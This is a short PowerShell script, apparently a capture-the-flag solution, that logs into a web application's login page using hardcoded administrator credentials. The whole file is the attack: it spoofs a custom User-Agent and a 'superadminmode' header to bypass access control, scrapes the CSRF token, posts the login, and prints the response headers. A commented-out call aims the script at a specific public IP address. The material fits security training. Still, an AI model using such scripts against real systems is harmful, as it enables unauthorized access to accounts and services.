```
function b_gold ($ip) {
  $user = "santaSiteAdmin"
  $pass = "S4n%2B4sr3411yC00Lp455wd"
  $u = "http://$ip`:8000/login?id=viewer"
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  $s.UserAgent = "MrsThePointALot"

  # superadminmode header
  $h = @{"superadminmode"="true"}

  # Get CSRF token
  $ProgressPreference = 0
  $r = iwr "$u" -WebSession $s -Headers $h
  if ($r.Content -match 'csrf_token.*?value="([^"]+)"') {$csrf = $matches[1]}

  # Login with cookie from first request and print headers
  $b = "csrf_token=$csrf&username=$user&password=$pass"
  $h["Origin"] = $u
  $h["Referer"] = "$u"
  $r = iwr "$u" -Method "POST" -WebSession $s -Headers $h -Body $b
  $r.Headers
}

# b_gold 34.72.26.140

```